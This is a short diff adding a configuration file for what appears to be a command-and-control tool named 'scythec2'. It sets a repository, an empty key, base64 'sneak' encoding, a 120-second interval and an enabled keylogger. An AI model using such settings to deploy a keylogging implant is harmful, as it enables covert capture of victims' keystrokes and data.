@@ -1,0 +1,6 @@
+REPO="ItsMonish/scythec2"
+KEY=""
+SNEAK="base64"
+INTERVAL="120"
+KEYLOGGER=True
+CLIPBOARD=False
